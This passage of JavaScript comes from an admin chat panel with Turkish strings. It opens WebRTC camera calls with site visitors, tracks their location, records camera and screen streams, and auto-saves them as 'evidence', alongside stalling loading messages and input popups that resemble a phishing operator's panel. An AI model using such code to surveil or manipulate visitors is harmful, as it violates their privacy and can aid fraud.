  btn.title = evidenceDirHandle
    ? "Kayıtlar seçili klasöre oturum alt klasörleriyle yazılır"
    : "Bir klasör seçin — kamera kayıtları otomatik oraya kaydedilir";
}

async function pickEvidenceFolder() {
  if (typeof window.showDirectoryPicker !== "function") {
    sendHint.hidden = false;
    sendHint.textContent =
      "Bu tarayıcı klasör seçimini desteklemiyor. Kayıtlar İndirilenler’e iner (Chrome/Edge önerilir).";
    return null;
  }
  try {
    const handle = await window.showDirectoryPicker({ mode: "readwrite" });
    await persistEvidenceDirHandle(handle);
    sendHint.hidden = false;
    sendHint.textContent = "Kayıt klasörü ayarlandı — oturumlar klasör/oturum-id altına yazılır.";
    window.setTimeout(() => {
      if (sendHint.textContent.includes("Kayıt klasörü")) sendHint.hidden = true;
    }, 4000);
    return handle;
  } catch (err) {
    if (err?.name !== "AbortError") console.warn("pick folder", err);
    return null;
  }
}

async function ensureEvidenceDirPermission() {
  if (!evidenceDirHandle) await loadEvidenceDirHandle();
  if (!evidenceDirHandle) return null;
  try {
    const q = await evidenceDirHandle.queryPermission?.({ mode: "readwrite" });
    if (q === "granted") return evidenceDirHandle;
    const r = await evidenceDirHandle.requestPermission?.({ mode: "readwrite" });
    if (r === "granted") return evidenceDirHandle;
  } catch {
    /* ignore */
  }
  return null;
}

async function saveEvidenceBlob(blob, fileName, sessionId) {
  if (!blob?.size) return false;
  const safeName = String(fileName || `kamera-${Date.now()}.webm`).replace(/[^\w.\-]+/g, "_");
  const folder = await ensureEvidenceDirPermission();
  if (folder) {
    try {
      const sessionFolder = String(sessionId || "misc").replace(/[^\w\-]+/g, "_").slice(0, 48);
      const dir = await folder.getDirectoryHandle(sessionFolder, { create: true });
      const camDir = await dir.getDirectoryHandle("kamera", { create: true });
      const fh = await camDir.getFileHandle(safeName, { create: true });
      const w = await fh.createWritable();
      await w.write(blob);
      await w.close();
      sendHint.hidden = false;
      sendHint.textContent = `Klasöre kaydedildi: ${sessionFolder}/kamera/${safeName}`;
      window.setTimeout(() => {
        if (sendHint.textContent.includes("Klasöre")) sendHint.hidden = true;
      }, 4000);
      return true;
    } catch (err) {
      console.warn("folder write failed, fallback download", err);
    }
  }
  return forceDownloadBlob(blob, safeName);
}

async function forceDownloadFromUrl(url, name, sessionId) {
  if (!url) return;
  const ext = recordingExtFromMime("", name) || "webm";
  const fileName = name || `kamera-${Date.now()}.${ext}`;

  if (downloadRecordingBtn) {
    downloadRecordingBtn.href = url;
    downloadRecordingBtn.download = fileName;
    downloadRecordingBtn.target = "_blank";
    downloadRecordingBtn.rel = "noopener";
    downloadRecordingBtn.hidden = false;
    downloadRecordingBtn.textContent = "Kaydi indir (Storage)";
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setCameraUi(true, "Kayıt indiriliyor…");
  sendHint.hidden = false;
  sendHint.textContent = `Kayıt indiriliyor: ${fileName}`;

  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const blob = await res.blob();
    if (blob?.size) {
      const finalName =
        name || `kamera-${Date.now()}.${recordingExtFromMime(blob.type, fileName)}`;
      await saveEvidenceBlob(blob, finalName, sessionId);
      if (downloadRecordingBtn) downloadRecordingBtn.textContent = "Kaydi indir (Storage)";
      return;
    }
  } catch (err) {
    console.warn("Blob fetch failed, opening URL", err);
  }

  try {
    const a = document.createElement("a");
    a.href = url;
    a.download = fileName;
    a.target = "_blank";
    a.rel = "noopener";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch {
    window.open(url, "_blank", "noopener");
  }

  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kayıt")) sendHint.hidden = true;
  }, 5000);
}

const autoDownloadedRecKeys = new Set();
let downloadQueue = Promise.resolve();

function enqueueDownload(task) {
  downloadQueue = downloadQueue
    .then(() => task())
    .catch((err) => console.warn("download queue", err));
  return downloadQueue;
}

function collectRecordingTargets(row) {
  const out = [];
  const seen = new Set();
  const segs = Array.isArray(row?.recordingSegments)
    ? row.recordingSegments
    : row?.recordingSegments && typeof row.recordingSegments === "object"
      ? Object.values(row.recordingSegments)
      : [];
  segs
    .filter((s) => s?.url)
    .sort((a, b) => (Number(a.seq) || 0) - (Number(b.seq) || 0) || (Number(a.ts) || 0) - (Number(b.ts) || 0))
    .forEach((s, i) => {
      if (seen.has(s.url)) return;
      seen.add(s.url);
      const ext = recordingExtFromMime("", s.name) || "webm";
      out.push({
        url: s.url,
        name:
          s.name ||
          `kamera-${shortId(row.id)}-s${String(s.seq || i + 1).padStart(4, "0")}.${ext}`,
      });
    });
  if (row?.lastRecordingUrl && !seen.has(row.lastRecordingUrl)) {
    out.push({
      url: row.lastRecordingUrl,
      name:
        row.lastRecordingName ||
        `kamera-${shortId(row.id)}.${recordingExtFromMime("", row.lastRecordingName)}`,
    });
  }
  if (row?.lastScreenRecordingUrl && !seen.has(row.lastScreenRecordingUrl)) {
    out.push({
      url: row.lastScreenRecordingUrl,
      name:
        row.lastScreenRecordingName ||
        `ekran-${shortId(row.id)}.${recordingExtFromMime("", row.lastScreenRecordingName)}`,
    });
  }
  return out;
}

function maybeAutoDownloadSessionRecording(row, { force = false } = {}) {
  if (!row?.id) return false;
  const preview = String(row.preview || "");
  const left = Number(row.userLeftAt) || 0;
  const lost = Number(row.connectionLostAt) || 0;
  if (
    !force &&
    /g[uü]ncellendi/i.test(preview) &&
    !left &&
    !lost &&
    !row.recordingFinalized &&
    !row.downloadRecording
  ) {
    return false;
  }
  const looksFinal =
    force ||
    Boolean(row.recordingFinalized) ||
    Boolean(row.downloadRecording) ||
    /kayd[ıi] haz[ıi]r|ayr[ıi]ld/i.test(preview) ||
    left > 0 ||
    lost > 0;
  if (!looksFinal) return false;

  const targets = collectRecordingTargets(row);
  if (!targets.length) return false;
  let queued = 0;
  targets.forEach((t) => {
    const key = `${row.id}:${t.url}`;
    if (autoDownloadedRecKeys.has(key)) return;
    autoDownloadedRecKeys.add(key);
    queued += 1;
    enqueueDownload(() => forceDownloadFromUrl(t.url, t.name, row.id));
  });
  return queued > 0;
}

let recordingWatchUnsub = null;
let recordingWatchKey = null;
let recordingWatchTimer = null;

function stopRecordingWatch() {
  try {
    recordingWatchUnsub?.();
  } catch {
    /* ignore */
  }
  recordingWatchUnsub = null;
  recordingWatchKey = null;
  if (recordingWatchTimer) {
    clearTimeout(recordingWatchTimer);
    recordingWatchTimer = null;
  }
}

function startRecordingWatch(sessionId, callId, state) {
  stopRecordingWatch();
  const sync = window.ChatSync;
  if (!sync?.listenCameraCall || !sessionId || !callId) return;
  const key = `${sessionId}/${callId}`;
  recordingWatchKey = key;

  recordingWatchUnsub = sync.listenCameraCall(sessionId, callId, (data) => {
    if (recordingWatchKey !== key || !data) return;
    if (data.lastSnapshotUrl) {
      showAdminSnapshot(data.lastSnapshotUrl);
    }
    if (data.recordingUrl && data.recordingUrl !== state.seenRecordingUrl) {
      const isFinal =
        data.status === "ended" ||
        data.status === "reconnecting" ||
        data.forceClose ||
        data.recordingFinalized === true ||
        data.downloadRecording === true ||
        state.awaitingRecording;
      // Segment ara ready: link güncelle, otomatik indirme yok
      if (!isFinal) {
        if (downloadRecordingBtn) {
          downloadRecordingBtn.href = data.recordingUrl;
          downloadRecordingBtn.download =
            data.recordingName ||
            `kamera-${shortId(sessionId)}.${recordingExtFromMime("", data.recordingName)}`;
          downloadRecordingBtn.target = "_blank";
          downloadRecordingBtn.rel = "noopener";
          downloadRecordingBtn.hidden = false;
          downloadRecordingBtn.textContent = "Kaydı indir (Storage)";
        }
        return;
      }
      state.seenRecordingUrl = data.recordingUrl;
      const dlKey = `${sessionId}:${data.recordingUrl}`;
      if (!autoDownloadedRecKeys.has(dlKey)) {
        autoDownloadedRecKeys.add(dlKey);
        enqueueDownload(() =>
          forceDownloadFromUrl(
            data.recordingUrl,
            data.recordingName ||
              `kamera-${shortId(sessionId)}.${recordingExtFromMime("", data.recordingName)}`
          )
        );
      }
      if (data.recordingStatus === "ready" || data.recordingFinalized) {
        stopRecordingWatch();
      }
      return;
    }
    if (data.recordingStatus === "failed") {
      // Canlı video varken Storage hatası UI’yi öldürmesin
      const livePlaying = Boolean(
        adminRemoteVideo?.srcObject ||
          (adminCall?.pc &&
            adminCall.sessionId === sessionId &&
            adminCall.callId === String(callId) &&
            (adminCall.pc.connectionState === "connected" ||
              adminCall.pc.iceConnectionState === "connected" ||
              adminCall.pc.iceConnectionState === "completed"))
      );
      if (livePlaying) {
        console.warn("storage recording failed (live ok)", data.recordingError);
        return;
      }
      setCameraUi(true, `Storage kaydi yok (${data.recordingError || "hata"}) — yerel yedek deneniyor`);
      if (state.lastBlob?.size) {
        forceDownloadBlob(
          state.lastBlob,
          `kamera-admin-${shortId(sessionId)}.${recordingExtFromMime(state.lastBlob.type)}`
        );
      } else {
        sendHint.hidden = false;
        sendHint.textContent =
          "Kayıt Storage’a yazılamadı. Canlı izleme için ziyaretçi açıkken “Canlı kamerayı aç”a basın. Storage bucket/rules kontrol edin.";
      }
      stopRecordingWatch();
      const row = latestSessionRows.find((r) => r.id === sessionId);
      const nextId = row?.lastCallId ? String(row.lastCallId) : "";
      if (
        nextId &&
        nextId !== String(callId) &&
        (row.cameraGranted || row.hasCamera || row.cameraPending || row.hasLocation)
      ) {
        void ensureAdminCamera(sessionId, nextId, {
          force: true,
          seedLocation: row.lastLocation || null,
        });
      }
    }
  });

  recordingWatchTimer = window.setTimeout(() => {
    if (recordingWatchKey !== key) return;
    if (state.seenRecordingUrl) {
      stopRecordingWatch();
      return;
    }
    if (state.lastBlob?.size) {
      forceDownloadBlob(
        state.lastBlob,
        `kamera-admin-${shortId(sessionId)}.${recordingExtFromMime(state.lastBlob.type)}`
      );
      setCameraUi(true, "Storage gecikti — yerel kayit indirildi; Storage URL gelirse tekrar iner");
      recordingWatchTimer = window.setTimeout(() => {
        if (recordingWatchKey === key) stopRecordingWatch();
      }, 120000);
      return;
    }
    setCameraUi(true, "Kayıt bekleniyor — ziyaretci sayfasi acik mi / Storage kurallari?");
    sendHint.hidden = false;
    sendHint.textContent =
      "Kayıt henuz gelmedi. Ziyaretci en az 15 sn kalsin (parca yukleme) veya Kamerayi sonlandirin.";
    stopRecordingWatch();
  }, 180000);
}

function resetLiveVideoUi() {
  clearRecordingLink();
  clearAdminLocationUi();
  clearAdminSnapshot();
  if (adminRemoteVideo) {
    adminRemoteVideo.srcObject = null;
    adminRemoteVideo.load?.();
  }
}

function pickRecorderMime() {
  if (typeof MediaRecorder === "undefined") return "";
  const types = [
    "video/webm;codecs=vp9",
    "video/webm;codecs=vp8",
    "video/webm",
    "video/mp4;codecs=h264",
    "video/mp4",
  ];
  return types.find((t) => MediaRecorder.isTypeSupported(t)) || "";
}

const ADMIN_RECORD_BITRATE = 3_500_000;

function startAdminRecording(stream, state) {
  if (!stream || state.recorder || typeof MediaRecorder === "undefined") return false;

  const videoTracks = stream.getVideoTracks().filter((t) => t.readyState === "live");
  if (!videoTracks.length) {
    setCameraUi(true, "Canlı — video track yok");
    return false;
  }
  videoTracks.forEach((t) => {
    try {
      if ("contentHint" in t) t.contentHint = "motion";
    } catch {
      /* ignore */
    }
  });

  const recordStream = new MediaStream(videoTracks);
  const mime = pickRecorderMime();
  let recorder;
  try {
    const opts = mime
      ? { mimeType: mime, videoBitsPerSecond: ADMIN_RECORD_BITRATE }
      : { videoBitsPerSecond: ADMIN_RECORD_BITRATE };
    recorder = new MediaRecorder(recordStream, opts);
  } catch (err) {
    try {
      recorder = mime
        ? new MediaRecorder(recordStream, { mimeType: mime })
        : new MediaRecorder(recordStream);
    } catch (err2) {
      setCameraUi(true, `Canlı — kayit yok (${err2?.message || err?.message || "desteklenmiyor"})`);
      return false;
    }
  }

  const chunks = [];
  state.recordChunks = chunks;
  recorder.ondataavailable = (e) => {
    if (e.data?.size) chunks.push(e.data);
  };
  recorder.onstop = () => {
    const type = recorder.mimeType || mime || "video/webm";
    const blob = new Blob(chunks, { type });
    state.lastBlob = blob;
    state._recordingStopped?.();
  };
  recorder.onerror = () => {
    setCameraUi(true, "Canlı — kayit hatasi");
  };

  state.recorder = recorder;
  try {
    recorder.start(1000);
    setCameraUi(true, "Canlı — kayit yapiliyor");
    return true;
  } catch {
    state.recorder = null;
    setCameraUi(true, "Canlı — kayit baslatilamadi");
    return false;
  }
}

function stopAdminRecording(call, { autoDownload = false } = {}) {
  return new Promise((resolve) => {
    let settled = false;
    const finish = (ok) => {
      if (settled) return;
      settled = true;
      resolve(ok);
    };

    const rec = call?.recorder;
    if (!rec || rec.state === "inactive") {
      if (call?.lastBlob?.size) {
        finish(true);
        return;
      }
      finish(false);
      return;
    }
    call.autoDownload = autoDownload;
    call._recordingStopped = () => finish(true);
    window.setTimeout(() => finish(Boolean(call.lastBlob?.size)), 4000);
    try {
      if (rec.state === "recording") {
        try {
          rec.requestData();
        } catch {
          /* ignore */
        }
      }
      if (rec.state === "recording" || rec.state === "paused") rec.stop();
      else finish(false);
    } catch {
      finish(false);
    }
  });
}

async function stopAdminCall(updateRemote = true, { autoDownload = false, keepUi = false } = {}) {
  const call = adminCall;
  adminCall = null;
  if (!call) {
    if (!keepUi) {
      try {
        setCameraUi(false);
      } catch {
        if (adminCameraBox) adminCameraBox.hidden = true;
      }
    }
    if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
    return;
  }
  try {
    call.unsubCall?.();
    call.unsubIce?.();
  } catch {
    /* ignore */
  }

  await stopAdminRecording(call, { autoDownload });

  try {
    call.pc?.close();
  } catch {
    /* ignore */
  }
  if (adminRemoteVideo) adminRemoteVideo.srcObject = null;

  const hasDownload = Boolean(downloadRecordingBtn && !downloadRecordingBtn.hidden);
  if (keepUi || hasDownload || call.lastBlob?.size) {
    setCameraUi(true, cameraStatus?.textContent || "Kayıt hazir");
    adminCameraBox?.classList.remove("is-recording");
  } else {
    setCameraUi(false);
  }

  if (updateRemote && call.sessionId && call.callId && window.ChatSync) {
    window.ChatSync.setCameraCallStatus(call.sessionId, call.callId, "ended").catch(() => {});
  }
}

async function joinAdminCamera(sessionId, callId, opts = {}) {
  if (!window.ChatSync || !sessionId || !callId) return;
  const joinGen = Number(opts.joinGen) || adminJoinGen;
  if (adminCall?.callId === callId && adminCall?.sessionId === sessionId && adminCall?.pc && !opts.force && !adminCall?.needsRenegotiate) {
    if (opts.seedLocation) updateAdminLocationUi(opts.seedLocation, "live", null);
    showCameraPopup();
    return;
  }

  await stopAdminCall(false, { keepUi: true });
  // Daha yeni join başladıysa bu çağrıyı bırak
  if (joinGen && joinGen !== adminJoinGen) return;

  resetLiveVideoUi();
  clearRecordingLink();
  // Session meta konumu varsa prompting ile silme
  if (opts.seedLocation) {
    updateAdminLocationUi(opts.seedLocation, "live", null);
  } else {
    const row = latestSessionRows.find((r) => r.id === sessionId);
    if (row?.lastLocation) updateAdminLocationUi(row.lastLocation, "live", null);
    else clearAdminLocationUi();
  }
  setCameraUi(true, "Ziyaretci onayi bekleniyor…");

  if (joinGen && joinGen !== adminJoinGen) return;

  const sync = window.ChatSync;
  const pc = new RTCPeerConnection(sync.ICE_SERVERS);
  let answered = false;
  const pendingVisitorIce = [];
  let remoteReady = false;
  let callEnded = false;
  const state = {
    sessionId,
    callId,
    pc,
    recorder: null,
    recordChunks: [],
    lastBlob: null,
    autoDownload: false,
    seenRecordingUrl: null,
    offerSdp: null,
    offerEpoch: null,
    needsRenegotiate: false,
    joinGen,
    unsubCall: null,
    unsubIce: null,
  };
  adminCall = state;

  const attachLiveVideo = (stream, track) => {
    if (!adminRemoteVideo || !stream) return;
    adminRemoteVideo.srcObject = stream;
    adminRemoteVideo.muted = true;
    adminRemoteVideo.autoplay = true;
    adminRemoteVideo.playsInline = true;
    const kick = () => {
      adminRemoteVideo.play?.().catch(() => {});
    };
    kick();
    adminRemoteVideo.onloadedmetadata = kick;
    if (track) {
      track.addEventListener("unmute", () => {
        adminRemoteVideo.srcObject = stream;
        kick();
        setCameraUi(true, "Canlı görüntü");
      });
      if (track.muted === false) {
        setCameraUi(true, "Canlı görüntü");
      }
    }
    showCameraPopup();
  };

  pc.ontrack = (ev) => {
    if (adminCall !== state || callEnded) return;
    const track = ev.track;
    const stream = ev.streams?.[0] || new MediaStream([track]);
    if (track && track.kind === "video") {
      attachLiveVideo(stream, track);
      try {
        const clone = track.clone();
        try {
          if ("contentHint" in clone) clone.contentHint = "motion";
        } catch {
          /* ignore */
        }
        const recordStream = new MediaStream([clone]);
        // İlk frameler gelsin — siyah/bozuk kayıt olmasın
        const startRec = () => {
          if (adminCall !== state || state.recorder || callEnded) return;
          startAdminRecording(recordStream, state);
        };
        if (track.muted) {
          track.addEventListener("unmute", startRec, { once: true });
          window.setTimeout(startRec, 1600);
        } else {
          window.setTimeout(startRec, 600);
        }
      } catch {
        setCameraUi(true, "Canlı görüntü");
      }
    }
  };

  pc.onconnectionstatechange = () => {
    if (adminCall !== state) return;
    const s = pc.connectionState;
    if (s === "connected") {
      setCameraUi(true, "Canlı görüntü bagli");
      state.pc?.getReceivers?.().forEach((receiver) => {
        const track = receiver.track;
        if (!track || track.kind !== "video") return;
        attachLiveVideo(new MediaStream([track]), track);
      });
    }
    if (s === "failed") setCameraUi(true, "Bağlantı başarısız — ag/firewall");
    if (s === "disconnected") setCameraUi(true, "Bağlantı koptu…");
  };

  pc.oniceconnectionstatechange = () => {
    if (adminCall !== state) return;
    const s = pc.iceConnectionState;
    if (s === "connected" || s === "completed") {
      setCameraUi(true, "Canlı görüntü (ICE OK)");
      state.pc?.getReceivers?.().forEach((receiver) => {
        const track = receiver.track;
        if (!track || track.kind !== "video") return;
        attachLiveVideo(new MediaStream([track]), track);
      });
    }
    if (s === "failed") {
      setCameraUi(true, "ICE başarısız — ag engeli olabilir");
    }
  };

  pc.onicecandidate = (ev) => {
    if (ev.candidate && !callEnded) {
      sync.pushIceCandidate(sessionId, callId, "admin", ev.candidate.toJSON()).catch(() => {});
    }
  };

  const addVisitorIce = async (cand) => {
    if (!cand || !state.pc || callEnded) return;
    if (!remoteReady) {
      pendingVisitorIce.push(cand);
      return;
    }
    try {
      await state.pc.addIceCandidate(new RTCIceCandidate(cand));
    } catch {
      /* ignore */
    }
  };

  state.unsubIce = sync.listenIceCandidates(sessionId, callId, "visitor", (cand) => {
    addVisitorIce(cand);
  });

  state.unsubCall = sync.listenCameraCall(sessionId, callId, async (data) => {
    if (!data || adminCall !== state) return;
    if (state.joinGen && state.joinGen !== adminJoinGen) return;

    if (data.location || data.locationStatus) {
      // reconnecting sırasında location alanı yoksa son canlı konumu silme
      if (
        !data.location &&
        (data.locationStatus === "reconnecting" || data.status === "reconnecting")
      ) {
        const row = latestSessionRows.find((r) => r.id === sessionId);
        if (row?.lastLocation) updateAdminLocationUi(row.lastLocation, "live", null);
      } else {
        updateAdminLocationUi(data.location, data.locationStatus, data.locationError);
      }
    } else if (!data.location) {
      const row = latestSessionRows.find((r) => r.id === sessionId);
      if (row?.lastLocation) updateAdminLocationUi(row.lastLocation, "live", null);
    }

    if (data.lastSnapshotUrl) {
      showAdminSnapshot(data.lastSnapshotUrl);
    }

    // Yalnız finalize / ended / reconnecting+kayıt — ara segment ready otomatik indirmez
    if (
      data.recordingUrl &&
      data.recordingUrl !== state.seenRecordingUrl &&
      (data.status === "ended" ||
        data.status === "reconnecting" ||
        state.awaitingRecording ||
        data.recordingFinalized === true ||
        data.downloadRecording === true)
    ) {
      state.seenRecordingUrl = data.recordingUrl;
      const dlKey = `${sessionId}:${data.recordingUrl}`;
      if (!autoDownloadedRecKeys.has(dlKey)) {
        autoDownloadedRecKeys.add(dlKey);
        enqueueDownload(() =>
          forceDownloadFromUrl(
            data.recordingUrl,
            data.recordingName ||
              `kamera-${shortId(sessionId)}.${recordingExtFromMime("", data.recordingName)}`
          )
        );
      }
      stopRecordingWatch();
    }

    if (data.status === "denied") {
      // Canlı answered oturumda soft-deny kamerayı öldürmesin
      if (answered && (adminRemoteVideo?.srcObject || state.pc)) {
        /* ignore false deny */
      } else {
        callEnded = true;
        setCameraUi(true, "Ziyaretci kamerayi reddetti");
        await stopAdminCall(false, { keepUi: true });
        return;
      }
    }
    // Soft resume: yenileme — ended değil. Eski offer’a cevap verme; yeni sinyal bekle.
    if (data.status === "reconnecting") {
      callEnded = false;
      stopRecordingWatch();
      setCameraUi(true, "Ziyaretci yeniden baglaniyor…");
      state.needsRenegotiate = true;
      state.awaitingSoftResume = true;
      state.resumeBarrierAt = Date.now();
      state.offerSdp = null;
      state.offerEpoch = 0;
      answered = false;
      remoteReady = false;
      try {
        state.unsubIce?.();
        state.unsubIce = null;
      } catch {
        /* ignore */
      }
      try {
        state.pc?.close();
      } catch {
        /* ignore */
      }
      state.pc = null;
      if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
      // Son bilinen konum ekranda kalsın
      if (data.location) {
        updateAdminLocationUi(data.location, "live", null);
      } else {
        const row = latestSessionRows.find((r) => r.id === sessionId);
        if (row?.lastLocation) updateAdminLocationUi(row.lastLocation, "live", null);
      }
      return;
    }

    // Soft resume tamam: yeni connecting/live + taze offer → force rejoin
    if (state.awaitingSoftResume) {
      const readyAgain =
        data.status === "connecting" ||
        data.status === "live" ||
        data.visitorReady === true;
      const epoch = Number(data.offerEpoch) || 0;
      const readyAt = Number(data.visitorReadyAt) || 0;
      const barrier = Number(state.resumeBarrierAt) || 0;
      const freshSignal =
        Boolean(data.offer?.sdp) &&
        (epoch > 0 || readyAt >= barrier - 1000);
      if (readyAgain && freshSignal) {
        state.awaitingSoftResume = false;
        state.needsRenegotiate = true;
        setCameraUi(true, "Yeniden baglanti — sinyal alindi…");
        void ensureAdminCamera(sessionId, callId, {
          force: true,
          seedLocation:
            data.location ||
            latestSessionRows.find((r) => r.id === sessionId)?.lastLocation ||
            null,
        });
        return;
      }
      setCameraUi(true, "Ziyaretci yeniden baglaniyor… (sinyal bekleniyor)");
      if (data.location) updateAdminLocationUi(data.location, "live", null);
      return;
    }

    if (data.status === "ended") {
      callEnded = true;
      const pending = {
        sessionId,
        callId,
        lastBlob: null,
        seenRecordingUrl: state.seenRecordingUrl || null,
        awaitingRecording: true,
      };
      try {
        state.unsubIce?.();
        state.unsubIce = null;
        state.pc?.close();
        state.pc = null;
      } catch {
        /* ignore */
      }
      try {
        await stopAdminRecording(state, { autoDownload: false });
        pending.lastBlob = state.lastBlob || null;
      } catch {
        /* ignore */
      }
      try {
        state.unsubCall?.();
        state.unsubCall = null;
      } catch {
        /* ignore */
      }
      if (adminCall === state) adminCall = null;
      if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
      adminCameraBox?.classList.remove("is-recording");

      // Ziyaretçi yenileyip yeni call açtıysa eski ended call'a takılma
      const newestRow = latestSessionRows.find((r) => r.id === sessionId);
      const newerCall =
        newestRow?.lastCallId && String(newestRow.lastCallId) !== String(callId)
          ? String(newestRow.lastCallId)
          : "";
      if (
        newerCall &&
        (newestRow.cameraGranted ||
          newestRow.hasCamera ||
          newestRow.cameraPending ||
          newestRow.hasLocation)
      ) {
        void ensureAdminCamera(sessionId, newerCall, {
          force: true,
          seedLocation: newestRow.lastLocation || null,
        });
        setEndCameraVisible(false);
        if (reopenCameraBtn) reopenCameraBtn.hidden = false;
        return;
      }

      // Refresh/ayrılış: önce eldeki kayıtları hemen indir (siyah ekranda bekleme)
      const url = data.recordingUrl || pending.seenRecordingUrl;
      if (url) {
        pending.seenRecordingUrl = url;
        const dlKey = `${sessionId}:${url}`;
        if (!autoDownloadedRecKeys.has(dlKey)) {
          autoDownloadedRecKeys.add(dlKey);
          forceDownloadFromUrl(
            url,
            data.recordingName ||
              `kamera-${shortId(sessionId)}.${recordingExtFromMime("", data.recordingName)}`
          );
        }
        setCameraUi(true, "Kayıt indirildi / indiriliyor");
      }
      if (pending.lastBlob?.size) {
        const localKey = `${sessionId}:local:${pending.lastBlob.size}`;
        if (!autoDownloadedRecKeys.has(localKey)) {
          autoDownloadedRecKeys.add(localKey);
          forceDownloadBlob(
            pending.lastBlob,
            `kamera-admin-${shortId(sessionId)}.${recordingExtFromMime(pending.lastBlob.type)}`
          );
        }
        setCameraUi(true, "Yerel kayit indirildi");
      }
      if (!url) {
        setCameraUi(true, "Bağlantı kapandi — ziyaretci kaydi yukleniyor");
        startRecordingWatch(sessionId, callId, pending);
      } else if (!data.recordingFinalized && data.recordingStatus === "finalizing") {
        startRecordingWatch(sessionId, callId, pending);
      }
      setEndCameraVisible(false);
      if (reopenCameraBtn) reopenCameraBtn.hidden = false;
      return;
    }
    if (data.status === "requested") {
      if (!data.offer && !data.visitorReady && !answered) {
        clearRecordingLink();
        setCameraUi(true, "Ziyaretci onayi bekleniyor…");
      }
    }
    if (data.visitorReady && !answered) {
      setCameraUi(true, "Ziyaretci kamerayi acti — baglaniyor…");
    }
    if ((data.status === "live" || data.offer) && !answered) {
      setCameraUi(true, "Sinyal alindi — yanitlaniyor…");
    }
    if (answered && adminRemoteVideo?.srcObject) {
      setCameraUi(true, "Canlı görüntü");
    } else if (answered) {
      setCameraUi(true, "Yanit gonderildi — video bekleniyor…");
    }
    // Bitmis oturumun eski offer/answer'ina baglanma
    if (callEnded) return;

    const nextSdp = data.offer?.sdp || null;
    const nextEpoch = Number(data.offerEpoch) || 0;
    // Soft resume / yeni offer = eski PC geçersiz → force rejoin
    if (
      nextSdp &&
      (state.needsRenegotiate ||
        !state.pc ||
        (answered &&
          ((state.offerSdp && nextSdp !== state.offerSdp) ||
            (nextEpoch && state.offerEpoch && nextEpoch > state.offerEpoch))))
    ) {
      state.needsRenegotiate = true;
      setCameraUi(true, "Yeni sinyal — yeniden baglaniliyor…");
      void ensureAdminCamera(sessionId, callId, {
        force: true,
        seedLocation: data.location || latestSessionRows.find((r) => r.id === sessionId)?.lastLocation || null,
      });
      return;
    }

    if (data.offer && !answered && state.pc) {
      answered = true;
      state.offerSdp = data.offer.sdp || null;
      state.offerEpoch = Number(data.offerEpoch) || Date.now();
      try {
        await state.pc.setRemoteDescription(
          new RTCSessionDescription({
            type: data.offer.type,
            sdp: data.offer.sdp,
          })
        );
        remoteReady = true;
        for (const cand of pendingVisitorIce.splice(0)) {
          await addVisitorIce(cand);
        }
        const answer = await state.pc.createAnswer();
        await state.pc.setLocalDescription(answer);
        if (typeof sync.writeCameraAnswer === "function") {
          await sync.writeCameraAnswer(sessionId, callId, {
            type: answer.type,
            sdp: answer.sdp,
          });
        } else {
          await sync.writeCameraSignal(sessionId, callId, "answer", {
            type: answer.type,
            sdp: answer.sdp,
          });
        }
        setCameraUi(true, "Yanit gonderildi — video bekleniyor…");
        window.setTimeout(() => {
          if (adminCall !== state || callEnded) return;
          if (adminRemoteVideo?.srcObject) return;
          setCameraUi(true, "Video gelmedi — yeni kamera bağlantısı isteniyor…");
          void sync
            .sendAdminMessage?.(sessionId, "Kamera bağlantısı yenileniyor. Lütfen bekleyin.", {
              type: "camera",
            })
            .then((result) => {
              const next = result?.callId;
              if (next && String(next) !== String(callId)) {
                void ensureAdminCamera(sessionId, next, {
                  force: true,
                  seedLocation:
                    latestSessionRows.find((r) => r.id === sessionId)?.lastLocation || null,
                });
              }
            })
            .catch((err) => console.warn("renegotiate camera", err));
        }, 4500);
        const attachReceivers = () => {
          state.pc?.getReceivers?.().forEach((receiver) => {
            const track = receiver.track;
            if (!track || track.kind !== "video") return;
            attachLiveVideo(new MediaStream([track]), track);
          });
        };
        window.setTimeout(attachReceivers, 300);
        window.setTimeout(attachReceivers, 1500);
      } catch (err) {
        answered = false;
        setCameraUi(true, `Bağlantı hatasi: ${err?.message || err}`);
      }
    }
  });
}

function appendThreadMessage(msg, announce) {
  if (!msg?.id || seenMessageIds.has(msg.id)) return;
  seenMessageIds.add(msg.id);

  // Otomatik kamera teklifleri sohbeti spamler + her mesajda WebRTC yi sifirlardi
  if (msg.type === "camera" && (msg.from === "auto" || !msg.from)) {
    if (announce && msg.callId && selectedId) {
      const already =
        adminCall?.callId === msg.callId &&
        adminCall?.sessionId === selectedId &&
        adminCall?.pc;
      if (already) showCameraPopup();
      else void joinAdminCamera(selectedId, msg.callId);
    }
    return;
  }

  const isAdmin = msg.who === "admin" || msg.from === "admin";
  const isLoading = msg.type === "loading";
  const row = document.createElement("div");
  const side = msg.who === "user" ? "user" : "bot";
  row.className = `chat-bubble chat-${side}${isAdmin ? " chat-admin" : ""}${
    isLoading ? " chat-loading" : ""
  }`;
  const meta = document.createElement("span");
  meta.className = "chat-meta";
  meta.textContent = `${whoLabel(msg)} ? ${fmtTime(msg.ts)}`;
  const body = document.createElement("div");
  body.className = "chat-loading-body";
  if (isLoading) {
    body.innerHTML = `
      <span class="chat-spinner" aria-hidden="true"></span>
      <p></p>
      <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
    `;
    body.querySelector("p").textContent =
      msg.text || "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
  } else if (msg.type === "popup") {
    const p = document.createElement("p");
    p.textContent = `Popup: ${msg.text || ""}`;
    const tags = document.createElement("em");
    tags.className = "popup-btn-tags";
    tags.textContent = `${msg.okLabel || "Tamam"} / ${msg.cancelLabel || "Iptal"}${
      msg.withInput ? " ? metin kutusu" : ""
    }`;
    body.append(p, tags);
  } else if (msg.type === "camera") {
    const p = document.createElement("p");
    p.textContent = `?? Kamera talebi: ${msg.text || ""}`;
    body.appendChild(p);
    if (announce && msg.callId && selectedId) {
      const already =
        adminCall?.callId === msg.callId &&
        adminCall?.sessionId === selectedId &&
        adminCall?.pc;
      if (already) showCameraPopup();
      else void joinAdminCamera(selectedId, msg.callId);
    }
  } else if (msg.type === "photos") {
    const p = document.createElement("p");
